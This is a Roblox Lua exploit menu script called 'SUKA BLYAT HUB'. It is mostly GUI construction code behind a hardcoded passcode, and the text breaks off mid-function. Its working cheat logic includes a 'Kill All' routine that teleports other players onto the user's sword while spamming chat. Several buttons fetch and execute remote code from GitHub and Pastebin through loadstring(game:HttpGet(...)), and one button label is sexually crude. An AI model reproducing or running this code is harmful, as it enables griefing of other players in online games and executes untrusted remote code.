---passcode: OPERATIONMOSCOW

local SLAVPANEL = Instance.new("ScreenGui")
local SLAVPAGES = Instance.new("Frame")
local LOGIN = Instance.new("Frame")
local UISizeConstraint = Instance.new("UISizeConstraint")
local ImageLabel = Instance.new("ImageLabel")
local UISizeConstraint_2 = Instance.new("UISizeConstraint")
local SUBMIT = Instance.new("TextButton")
local UISizeConstraint_3 = Instance.new("UISizeConstraint")
local PASSCODE = Instance.new("TextBox")
local UISizeConstraint_4 = Instance.new("UISizeConstraint")
local TextLabel = Instance.new("TextLabel")
local UISizeConstraint_5 = Instance.new("UISizeConstraint")
local MAIN = Instance.new("Frame")
local UISizeConstraint_6 = Instance.new("UISizeConstraint")
local ImageLabel_2 = Instance.new("ImageLabel")
local DECLAREWAR = Instance.new("TextButton")
local UISizeConstraint_7 = Instance.new("UISizeConstraint")
local UISizeConstraint_8 = Instance.new("UISizeConstraint")
local MUSIC = Instance.new("TextButton")
local UISizeConstraint_9 = Instance.new("UISizeConstraint")
local BOTTOMENU = Instance.new("ImageLabel")
local UISizeConstraint_10 = Instance.new("UISizeConstraint")
local TextLabel_2 = Instance.new("TextLabel")
local UISizeConstraint_11 = Instance.new("UISizeConstraint")
local MISSION = Instance.new("Frame")
local UISizeConstraint_12 = Instance.new("UISizeConstraint")
local ImageLabel_3 = Instance.new("ImageLabel")
local UISizeConstraint_13 = Instance.new("UISizeConstraint")
local SCRIPTS = Instance.new("ScrollingFrame")
local KILLALL = Instance.new("TextButton")
local UISizeConstraint_14 = Instance.new("UISizeConstraint")
local VHGUS = Instance.new("TextButton")
local UISizeConstraint_15 = Instance.new("UISizeConstraint")
local UISizeConstraint_16 = Instance.new("UISizeConstraint")
local FEANIMATIONS = Instance.new("TextButton")
local UISizeConstraint_17 = Instance.new("UISizeConstraint")
local IYADMIN = Instance.new("TextButton")
local UISizeConstraint_18 = Instance.new("UISizeConstraint")
local FATES = Instance.new("TextButton")
local UISizeConstraint_19 = Instance.new("UISizeConstraint")
local VHUGS2 = Instance.new("TextButton")
local UISizeConstraint_20 = Instance.new("UISizeConstraint")
local NAKED = Instance.new("TextButton")
local UISizeConstraint_21 = Instance.new("UISizeConstraint")
local MUSICBLAST = Instance.new("TextButton")
local UISizeConstraint_22 = Instance.new("UISizeConstraint")
local BOTTOMENU_2 = Instance.new("ImageLabel")
local UISizeConstraint_23 = Instance.new("UISizeConstraint")
local RETURN = Instance.new("TextButton")
local UISizeConstraint_24 = Instance.new("UISizeConstraint")
local TextLabel_3 = Instance.new("TextLabel")
local UISizeConstraint_25 = Instance.new("UISizeConstraint")
local TextLabel_4 = Instance.new("TextLabel")
local UISizeConstraint_26 = Instance.new("UISizeConstraint")
local OPENCLOSE = Instance.new("ImageButton")
local UISizeConstraint_27 = Instance.new("UISizeConstraint")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local LOADING = Instance.new("ImageLabel")
local UISizeConstraint_28 = Instance.new("UISizeConstraint")
local TextLabel_5 = Instance.new("TextLabel")
local UISizeConstraint_29 = Instance.new("UISizeConstraint")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local MUSIC_2 = Instance.new("ImageLabel")
local UISizeConstraint_30 = Instance.new("UISizeConstraint")
local BOTTOMENU_3 = Instance.new("ImageLabel")
local UISizeConstraint_31 = Instance.new("UISizeConstraint")
local RETURN_2 = Instance.new("TextButton")
local UISizeConstraint_32 = Instance.new("UISizeConstraint")
local ERRORBLYAT = Instance.new("ImageLabel")
local UISizeConstraint_33 = Instance.new("UISizeConstraint")
local WRONGMUSIC = Instance.new("TextButton")
local UISizeConstraint_34 = Instance.new("UISizeConstraint")
local RUSSIANMUSIC = Instance.new("TextButton")
local UISizeConstraint_35 = Instance.new("UISizeConstraint")
local RUSMUSIC = Instance.new("ImageLabel")
local UISizeConstraint_36 = Instance.new("UISizeConstraint")
local BOTTOMENU_4 = Instance.new("ImageLabel")
local UISizeConstraint_37 = Instance.new("UISizeConstraint")
local RETURN_3 = Instance.new("TextButton")
local UISizeConstraint_38 = Instance.new("UISizeConstraint")
local ERRORBLYAT_2 = Instance.new("ImageLabel")
local CHEEKI = Instance.new("TextButton")
local UISizeConstraint_39 = Instance.new("UISizeConstraint")
local TRIPOLOSKI = Instance.new("TextButton")
local UISizeConstraint_40 = Instance.new("UISizeConstraint")

--Properties:

SLAVPANEL.Name = "SLAVPANEL"
SLAVPANEL.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SLAVPANEL.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

SLAVPAGES.Name = "SLAVPAGES"
SLAVPAGES.Parent = SLAVPANEL
SLAVPAGES.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SLAVPAGES.BackgroundTransparency = 1.000
SLAVPAGES.Position = UDim2.new(0.122377619, 0, 0.100603625, 0)
SLAVPAGES.Size = UDim2.new(0, 646, 0, 394)

LOGIN.Name = "LOGIN"
LOGIN.Parent = SLAVPAGES
LOGIN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LOGIN.BorderSizePixel = 0
LOGIN.Position = UDim2.new(-0.00238699466, 0, 0.00201523304, 0)
LOGIN.Size = UDim2.new(0, 647, 0, 394)
LOGIN.Visible = false

UISizeConstraint.Parent = LOGIN

ImageLabel.Parent = LOGIN
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BorderSizePixel = 0
ImageLabel.Size = UDim2.new(0, 647, 0, 394)
ImageLabel.Image = "rbxassetid://2704034447"

UISizeConstraint_2.Parent = ImageLabel

SUBMIT.Name = "SUBMIT"
SUBMIT.Parent = LOGIN
SUBMIT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SUBMIT.Position = UDim2.new(0.398763508, 0, 0.685279191, 0)
SUBMIT.Size = UDim2.new(0, 128, 0, 27)
SUBMIT.Font = Enum.Font.SourceSans
SUBMIT.Text = "SUBMIT"
SUBMIT.TextColor3 = Color3.fromRGB(0, 0, 0)
SUBMIT.TextSize = 14.000

UISizeConstraint_3.Parent = SUBMIT

PASSCODE.Name = "PASSCODE"
PASSCODE.Parent = LOGIN
PASSCODE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PASSCODE.Position = UDim2.new(0.398763448, 0, 0.565989912, 0)
PASSCODE.Size = UDim2.new(0, 130, 0, 19)
PASSCODE.Font = Enum.Font.SourceSans
PASSCODE.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
PASSCODE.PlaceholderText = "Your KGB LOGIN"
PASSCODE.Text = ""
PASSCODE.TextColor3 = Color3.fromRGB(0, 0, 0)
PASSCODE.TextSize = 14.000

UISizeConstraint_4.Parent = PASSCODE

TextLabel.Parent = LOGIN
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.240
TextLabel.Position = UDim2.new(0.341576546, 0, 0.0253807139, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "операция родина логин"
TextLabel.TextColor3 = Color3.fromRGB(252, 255, 255)
TextLabel.TextSize = 60.000

UISizeConstraint_5.Parent = TextLabel

MAIN.Name = "MAIN"
MAIN.Parent = SLAVPAGES
MAIN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MAIN.BackgroundTransparency = 1.000
MAIN.BorderSizePixel = 0
MAIN.Position = UDim2.new(-0.00238698488, 0, 0.00201524445, 0)
MAIN.Size = UDim2.new(0, 647, 0, 394)
MAIN.Visible = false

UISizeConstraint_6.Parent = MAIN

ImageLabel_2.Parent = MAIN
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0, 0, -7.93147192e-05, 0)
ImageLabel_2.Size = UDim2.new(0, 646, 0, 370)
ImageLabel_2.Image = "rbxassetid://7597255927"

DECLAREWAR.Name = "DECLAREWAR"
DECLAREWAR.Parent = ImageLabel_2
DECLAREWAR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DECLAREWAR.BackgroundTransparency = 1.000
DECLAREWAR.BorderColor3 = Color3.fromRGB(175, 177, 177)
DECLAREWAR.Position = UDim2.new(0.0207264125, 0, 0.467098296, 0)
DECLAREWAR.Size = UDim2.new(0, 65, 0, 82)
DECLAREWAR.Font = Enum.Font.SourceSansBold
DECLAREWAR.Text = ""
DECLAREWAR.TextColor3 = Color3.fromRGB(0, 0, 0)
DECLAREWAR.TextSize = 28.000

UISizeConstraint_7.Parent = DECLAREWAR

UISizeConstraint_8.Parent = ImageLabel_2

MUSIC.Name = "MUSIC"
MUSIC.Parent = ImageLabel_2
MUSIC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MUSIC.BackgroundTransparency = 1.000
MUSIC.BorderColor3 = Color3.fromRGB(175, 177, 177)
MUSIC.Position = UDim2.new(0.0207264125, 0, 0.215746984, 0)
MUSIC.Size = UDim2.new(0, 65, 0, 86)
MUSIC.Font = Enum.Font.SourceSansBold
MUSIC.Text = ""
MUSIC.TextColor3 = Color3.fromRGB(0, 0, 0)
MUSIC.TextSize = 28.000

UISizeConstraint_9.Parent = MUSIC

BOTTOMENU.Name = "BOTTOMENU"
BOTTOMENU.Parent = MAIN
BOTTOMENU.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BOTTOMENU.BorderSizePixel = 0
BOTTOMENU.Position = UDim2.new(0, 0, 0.939086318, 0)
BOTTOMENU.Size = UDim2.new(0, 647, 0, 24)
BOTTOMENU.Image = "rbxassetid://7597260892"

UISizeConstraint_10.Parent = BOTTOMENU

TextLabel_2.Parent = MAIN
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.344667703, 0, 0.0253807101, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "WELCOME GLORIOUS LEADER WHAT U WANT TO DO?"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 28.000

UISizeConstraint_11.Parent = TextLabel_2

MISSION.Name = "MISSION"
MISSION.Parent = SLAVPAGES
MISSION.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MISSION.BorderSizePixel = 0
MISSION.Position = UDim2.new(-0.00238700211, 0, 0.00201524049, 0)
MISSION.Size = UDim2.new(0, 647, 0, 394)
MISSION.Visible = false

UISizeConstraint_12.Parent = MISSION

ImageLabel_3.Parent = MISSION
ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_3.BorderSizePixel = 0
ImageLabel_3.Size = UDim2.new(0, 647, 0, 370)
ImageLabel_3.Image = "rbxassetid://7597255927"

UISizeConstraint_13.Parent = ImageLabel_3

SCRIPTS.Name = "SCRIPTS"
SCRIPTS.Parent = ImageLabel_3
SCRIPTS.Active = true
SCRIPTS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SCRIPTS.BackgroundTransparency = 1.000
SCRIPTS.BorderSizePixel = 0
SCRIPTS.Position = UDim2.new(0.128284395, 0, 0.281725883, 0)
SCRIPTS.Size = UDim2.new(0, 511, 0, 242)

KILLALL.Name = "KILLALL"
KILLALL.Parent = SCRIPTS
KILLALL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KILLALL.BorderColor3 = Color3.fromRGB(175, 177, 177)
KILLALL.Position = UDim2.new(-0.000741559255, 0, 0.0906269848, 0)
KILLALL.Size = UDim2.new(0, 188, 0, 50)
KILLALL.Font = Enum.Font.SourceSansBold
KILLALL.Text = "Kill All"
KILLALL.TextColor3 = Color3.fromRGB(0, 0, 0)
KILLALL.TextSize = 28.000

UISizeConstraint_14.Parent = KILLALL

VHGUS.Name = "VHGUS"
VHGUS.Parent = SCRIPTS
VHGUS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VHGUS.BorderColor3 = Color3.fromRGB(175, 177, 177)
VHGUS.Position = UDim2.new(-0.00485303253, 0, 0.0031767888, 0)
VHGUS.Size = UDim2.new(0, 191, 0, 50)
VHGUS.Font = Enum.Font.SourceSansBold
VHGUS.Text = "VIBEHUGS GUI V1"
VHGUS.TextColor3 = Color3.fromRGB(0, 0, 0)
VHGUS.TextSize = 28.000

UISizeConstraint_15.Parent = VHGUS

UISizeConstraint_16.Parent = SCRIPTS

FEANIMATIONS.Name = "FEANIMATIONS"
FEANIMATIONS.Parent = SCRIPTS
FEANIMATIONS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FEANIMATIONS.BorderColor3 = Color3.fromRGB(175, 177, 177)
FEANIMATIONS.Position = UDim2.new(0.599843681, 0, 0.0031767888, 0)
FEANIMATIONS.Size = UDim2.new(0, 191, 0, 50)
FEANIMATIONS.Font = Enum.Font.SourceSansBold
FEANIMATIONS.Text = "FE ANIMATIONS"
FEANIMATIONS.TextColor3 = Color3.fromRGB(0, 0, 0)
FEANIMATIONS.TextSize = 28.000

UISizeConstraint_17.Parent = FEANIMATIONS

IYADMIN.Name = "IYADMIN"
IYADMIN.Parent = SCRIPTS
IYADMIN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
IYADMIN.BorderColor3 = Color3.fromRGB(175, 177, 177)
IYADMIN.Position = UDim2.new(0.598084331, 0, 0.0906269848, 0)
IYADMIN.Size = UDim2.new(0, 188, 0, 50)
IYADMIN.Font = Enum.Font.SourceSansBold
IYADMIN.Text = "InfYield Admin"
IYADMIN.TextColor3 = Color3.fromRGB(0, 0, 0)
IYADMIN.TextSize = 28.000

UISizeConstraint_18.Parent = IYADMIN

FATES.Name = "FATES"
FATES.Parent = SCRIPTS
FATES.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FATES.BorderColor3 = Color3.fromRGB(175, 177, 177)
FATES.Position = UDim2.new(-0.000939071178, 0, 0.186960578, 0)
FATES.Size = UDim2.new(0, 191, 0, 50)
FATES.Font = Enum.Font.SourceSansBold
FATES.Text = "Fates Admin"
FATES.TextColor3 = Color3.fromRGB(0, 0, 0)
FATES.TextSize = 28.000

UISizeConstraint_19.Parent = FATES

VHUGS2.Name = "VHUGS2"
VHUGS2.Parent = SCRIPTS
VHUGS2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VHUGS2.BorderColor3 = Color3.fromRGB(175, 177, 177)
VHUGS2.Position = UDim2.new(0.599843681, 0, 0.186960578, 0)
VHUGS2.Size = UDim2.new(0, 191, 0, 50)
VHUGS2.Font = Enum.Font.SourceSansBold
VHUGS2.Text = "BLYAT HUGS"
VHUGS2.TextColor3 = Color3.fromRGB(0, 0, 0)
VHUGS2.TextSize = 28.000

UISizeConstraint_20.Parent = VHUGS2

NAKED.Name = "NAKED"
NAKED.Parent = SCRIPTS
NAKED.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NAKED.BorderColor3 = Color3.fromRGB(175, 177, 177)
NAKED.Position = UDim2.new(-0.000939071178, 0, 0.291014642, 0)
NAKED.Size = UDim2.new(0, 191, 0, 50)
NAKED.Font = Enum.Font.SourceSansBold
NAKED.Text = "GET NAKED IN FRONT OF SLUTS"
NAKED.TextColor3 = Color3.fromRGB(0, 0, 0)
NAKED.TextSize = 14.000

UISizeConstraint_21.Parent = NAKED

MUSICBLAST.Name = "MUSICBLAST"
MUSICBLAST.Parent = SCRIPTS
MUSICBLAST.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MUSICBLAST.BorderColor3 = Color3.fromRGB(175, 177, 177)
MUSICBLAST.Position = UDim2.new(0.599843681, 0, 0.291014642, 0)
MUSICBLAST.Size = UDim2.new(0, 191, 0, 50)
MUSICBLAST.Font = Enum.Font.SourceSansBold
MUSICBLAST.Text = "MUSICTAMPER"
MUSICBLAST.TextColor3 = Color3.fromRGB(0, 0, 0)
MUSICBLAST.TextSize = 14.000

UISizeConstraint_22.Parent = MUSICBLAST

BOTTOMENU_2.Name = "BOTTOMENU"
BOTTOMENU_2.Parent = MISSION
BOTTOMENU_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BOTTOMENU_2.BorderSizePixel = 0
BOTTOMENU_2.Position = UDim2.new(0, 0, 0.939086318, 0)
BOTTOMENU_2.Size = UDim2.new(0, 647, 0, 24)
BOTTOMENU_2.Image = "rbxassetid://7597260892"

UISizeConstraint_23.Parent = BOTTOMENU_2

RETURN.Name = "RETURN"
RETURN.Parent = BOTTOMENU_2
RETURN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RETURN.BackgroundTransparency = 1.000
RETURN.BorderColor3 = Color3.fromRGB(175, 177, 177)
RETURN.Position = UDim2.new(-0.00200000009, 0, 0.0500000007, 0)
RETURN.Size = UDim2.new(0, 61, 0, 22)
RETURN.Font = Enum.Font.SourceSansBold
RETURN.Text = ""
RETURN.TextColor3 = Color3.fromRGB(0, 0, 0)
RETURN.TextSize = 28.000

UISizeConstraint_24.Parent = RETURN

TextLabel_3.Parent = MISSION
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.36321485, 0, 0.0279187821, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "SUKA BLYAT HUB"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 45.000

UISizeConstraint_25.Parent = TextLabel_3

TextLabel_4.Parent = MISSION
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.36321485, 0, 0.144670054, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "Press bottom left corner (green button to go back to menu)"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 25.000

UISizeConstraint_26.Parent = TextLabel_4

OPENCLOSE.Name = "OPENCLOSE"
OPENCLOSE.Parent = SLAVPAGES
OPENCLOSE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OPENCLOSE.Position = UDim2.new(-0.162538707, 0, 0.407175332, 0)
OPENCLOSE.Size = UDim2.new(0, 76, 0, 73)
OPENCLOSE.Visible = false
OPENCLOSE.Image = "http://www.roblox.com/asset/?id=1688808005"

UISizeConstraint_27.Parent = OPENCLOSE

UIAspectRatioConstraint.Parent = OPENCLOSE

LOADING.Name = "LOADING"
LOADING.Parent = SLAVPAGES
LOADING.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LOADING.BorderSizePixel = 0
LOADING.Position = UDim2.new(0.000322042033, 0, 0.00205690414, 0)
LOADING.Size = UDim2.new(0, 647, 0, 394)
LOADING.Image = "rbxassetid://7597308711"

UISizeConstraint_28.Parent = LOADING

TextLabel_5.Parent = LOADING
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.0981313288, 0, -0.0011195913, 0)
TextLabel_5.Size = UDim2.new(0, 521, 0, 60)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "загрузка секретных миссий для Родины. пожалуйста, подождите несколько секунд, пока панель загрузится"
TextLabel_5.TextColor3 = Color3.fromRGB(252, 252, 252)
TextLabel_5.TextSize = 14.000

UISizeConstraint_29.Parent = TextLabel_5

UIAspectRatioConstraint_2.Parent = LOADING
UIAspectRatioConstraint_2.AspectRatio = 1.640

MUSIC_2.Name = "MUSIC"
MUSIC_2.Parent = SLAVPAGES
MUSIC_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MUSIC_2.BorderSizePixel = 0
MUSIC_2.Size = UDim2.new(0, 647, 0, 394)
MUSIC_2.Visible = false
MUSIC_2.Image = "rbxassetid://7612752334"

UISizeConstraint_30.Parent = MUSIC_2

BOTTOMENU_3.Name = "BOTTOMENU"
BOTTOMENU_3.Parent = MUSIC_2
BOTTOMENU_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BOTTOMENU_3.BorderSizePixel = 0
BOTTOMENU_3.Position = UDim2.new(0, 0, 0.939086318, 0)
BOTTOMENU_3.Size = UDim2.new(0, 647, 0, 24)
BOTTOMENU_3.Image = "rbxassetid://7597260892"

UISizeConstraint_31.Parent = BOTTOMENU_3

RETURN_2.Name = "RETURN"
RETURN_2.Parent = BOTTOMENU_3
RETURN_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RETURN_2.BackgroundTransparency = 1.000
RETURN_2.BorderColor3 = Color3.fromRGB(175, 177, 177)
RETURN_2.Position = UDim2.new(-0.00200000009, 0, 0.0500000007, 0)
RETURN_2.Size = UDim2.new(0, 61, 0, 22)
RETURN_2.Font = Enum.Font.SourceSansBold
RETURN_2.Text = ""
RETURN_2.TextColor3 = Color3.fromRGB(0, 0, 0)
RETURN_2.TextSize = 28.000

UISizeConstraint_32.Parent = RETURN_2

ERRORBLYAT.Name = "ERRORBLYAT"
ERRORBLYAT.Parent = MUSIC_2
ERRORBLYAT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ERRORBLYAT.BorderSizePixel = 0
ERRORBLYAT.Position = UDim2.new(0.394126743, 0, 0.294416249, 0)
ERRORBLYAT.Size = UDim2.new(0, 194, 0, 138)
ERRORBLYAT.Visible = false
ERRORBLYAT.Image = "rbxassetid://7612801582"

UISizeConstraint_33.Parent = ERRORBLYAT

WRONGMUSIC.Name = "WRONGMUSIC"
WRONGMUSIC.Parent = MUSIC_2
WRONGMUSIC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WRONGMUSIC.BorderSizePixel = 2
WRONGMUSIC.Position = UDim2.new(0.332302928, 0, 0.223350257, 0)
WRONGMUSIC.Size = UDim2.new(0, 360, 0, 50)
WRONGMUSIC.Font = Enum.Font.SourceSans
WRONGMUSIC.Text = "American Music"
WRONGMUSIC.TextColor3 = Color3.fromRGB(0, 0, 0)
WRONGMUSIC.TextSize = 14.000

UISizeConstraint_34.Parent = WRONGMUSIC

RUSSIANMUSIC.Name = "RUSSIANMUSIC"
RUSSIANMUSIC.Parent = MUSIC_2
RUSSIANMUSIC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RUSSIANMUSIC.BorderSizePixel = 2
RUSSIANMUSIC.Position = UDim2.new(0.332302928, 0, 0.370558381, 0)
RUSSIANMUSIC.Size = UDim2.new(0, 360, 0, 50)
RUSSIANMUSIC.Font = Enum.Font.SourceSans
RUSSIANMUSIC.Text = "Russian Hardbass"
RUSSIANMUSIC.TextColor3 = Color3.fromRGB(0, 0, 0)
RUSSIANMUSIC.TextSize = 14.000

UISizeConstraint_35.Parent = RUSSIANMUSIC

RUSMUSIC.Name = "RUSMUSIC"
RUSMUSIC.Parent = MUSIC_2
RUSMUSIC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RUSMUSIC.BorderSizePixel = 0
RUSMUSIC.Size = UDim2.new(0, 647, 0, 394)
RUSMUSIC.Visible = false
RUSMUSIC.Image = "rbxassetid://7612752334"

UISizeConstraint_36.Parent = RUSMUSIC

BOTTOMENU_4.Name = "BOTTOMENU"
BOTTOMENU_4.Parent = RUSMUSIC
BOTTOMENU_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BOTTOMENU_4.BorderSizePixel = 0
BOTTOMENU_4.Position = UDim2.new(0, 0, 0.939086318, 0)
BOTTOMENU_4.Size = UDim2.new(0, 647, 0, 24)
BOTTOMENU_4.Image = "rbxassetid://7597260892"

UISizeConstraint_37.Parent = BOTTOMENU_4

RETURN_3.Name = "RETURN"
RETURN_3.Parent = BOTTOMENU_4
RETURN_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RETURN_3.BackgroundTransparency = 1.000
RETURN_3.BorderColor3 = Color3.fromRGB(175, 177, 177)
RETURN_3.Position = UDim2.new(-0.00200000009, 0, 0.0500000007, 0)
RETURN_3.Size = UDim2.new(0, 61, 0, 22)
RETURN_3.Font = Enum.Font.SourceSansBold
RETURN_3.Text = ""
RETURN_3.TextColor3 = Color3.fromRGB(0, 0, 0)
RETURN_3.TextSize = 28.000

UISizeConstraint_38.Parent = RETURN_3

ERRORBLYAT_2.Name = "ERRORBLYAT"
ERRORBLYAT_2.Parent = RUSMUSIC
ERRORBLYAT_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ERRORBLYAT_2.BorderSizePixel = 0
ERRORBLYAT_2.Position = UDim2.new(0.394126743, 0, 0.294416249, 0)
ERRORBLYAT_2.Size = UDim2.new(0, 194, 0, 138)
ERRORBLYAT_2.Visible = false
ERRORBLYAT_2.Image = "rbxassetid://7612801582"

CHEEKI.Name = "CHEEKI"
CHEEKI.Parent = RUSMUSIC
CHEEKI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CHEEKI.Position = UDim2.new(0.332302928, 0, 0.223350257, 0)
CHEEKI.Size = UDim2.new(0, 360, 0, 50)
CHEEKI.Font = Enum.Font.SourceSans
CHEEKI.Text = "CHEEKI BREEKI"
CHEEKI.TextColor3 = Color3.fromRGB(0, 0, 0)
CHEEKI.TextSize = 14.000

UISizeConstraint_39.Parent = CHEEKI

TRIPOLOSKI.Name = "TRIPOLOSKI"
TRIPOLOSKI.Parent = RUSMUSIC
TRIPOLOSKI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TRIPOLOSKI.Position = UDim2.new(0.332302928, 0, 0.35025382, 0)
TRIPOLOSKI.Size = UDim2.new(0, 360, 0, 50)
TRIPOLOSKI.Font = Enum.Font.SourceSans
TRIPOLOSKI.Text = "TRIPOLOSKI"
TRIPOLOSKI.TextColor3 = Color3.fromRGB(0, 0, 0)
TRIPOLOSKI.TextSize = 14.000

UISizeConstraint_40.Parent = TRIPOLOSKI

-- Scripts:

local function NWHYBAD_fake_script() -- SUBMIT.LocalScript 
	local script = Instance.new('LocalScript', SUBMIT)

	local code = "OPERATIONMOSCOW" --This is the code the player has to enter
	local SB = script.Parent 
	local current = script.Parent.Parent
	local MAIN = script.Parent.Parent.Parent.MAIN
	local PASSCODE = script.Parent.Parent.PASSCODE --Change to correct name if you have one
	local openclose = current.Parent.OPENCLOSE
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if PASSCODE.Text == code then --If the bar's text is the same as code 
			wait(0)
			MAIN.Visible = true
			openclose.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(NWHYBAD_fake_script)()
local function BXMVZZV_fake_script() -- DECLAREWAR.LocalScript 
	local script = Instance.new('LocalScript', DECLAREWAR)

	local SB = script.Parent --Submit Button
	local current = script.Parent.Parent.Parent
	local F = script.Parent.Parent.Parent.Parent.MISSION
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if F.Visible == false and current.Visible == true then 
			wait(0)
			F.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(BXMVZZV_fake_script)()
local function JPVWHFN_fake_script() -- MUSIC.LocalScript 
	local script = Instance.new('LocalScript', MUSIC)

	local SB = script.Parent --Submit Button
	local current = script.Parent.Parent.Parent
	local F = script.Parent.Parent.Parent.Parent.MUSIC
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if F.Visible == false and current.Visible == true then 
			wait(0)
			F.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(JPVWHFN_fake_script)()
local function AVKNB_fake_script() -- KILLALL.LocalScript 
	local script = Instance.new('LocalScript', KILLALL)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		task.spawn(function()
			local CoordinateFrame = CFrame.new(-8.65939236, 22.2416039, 51.2895126)
			local Character = game:GetService("Players").LocalPlayer.Character
			local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
	
			Humanoid.RootPart.CFrame = CoordinateFrame
			local Tool = Character:FindFirstChildWhichIsA("Tool") or Character:WaitForChild("Sword")
			local Handle = Tool:WaitForChild("Handle")
	
			for i = 1, 7, 1 do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("shawnjbragdon 0001 " .. string.rep(".", math.random(1, 3)), "All")
			end
	
			while true do
				if Tool:IsDescendantOf(Character) then
					for _, Player in pairs(game:GetService("Players"):GetPlayers()) do
						if Player ~= game:GetService("Players").LocalPlayer then
							pcall(function()
								Player.Character:FindFirstChildWhichIsA("Humanoid").RootPart.CFrame = Handle.CFrame * CFrame.new(math.random() / 8, math.random() / 8, math.random() / 8)
							end)
						end
					end
					Tool:Activate()
				end
				task.wait(0)
			end
		end)
	end)
end
coroutine.wrap(AVKNB_fake_script)()
local function NCFW_fake_script() -- VHGUS.LocalScript 
	local script = Instance.new('LocalScript', VHGUS)

	local button = script.Parent
	
	button.MouseButton1Down:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/offperms/Vibe-hugs/main/Admin%20UI"))()
	end)
end
coroutine.wrap(NCFW_fake_script)()
local function ISCH_fake_script() -- FEANIMATIONS.LocalScript 
	local script = Instance.new('LocalScript', FEANIMATIONS)

	local button = script.Parent
	script.Parent.MouseButton1Click:Connect(function()
		if _G.emotegui then 
			return end _G.emotegui = true return loadstring(game:HttpGet("https://pastebin.com/raw/DjsEQMxQ"))(); 
	end)
end
coroutine.wrap(ISCH_fake_script)()
local function CEULJ_fake_script() -- IYADMIN.LocalScript 
	local script = Instance.new('LocalScript', IYADMIN)

	local button = script.Parent
	
	button.MouseButton1Down:Connect(function()
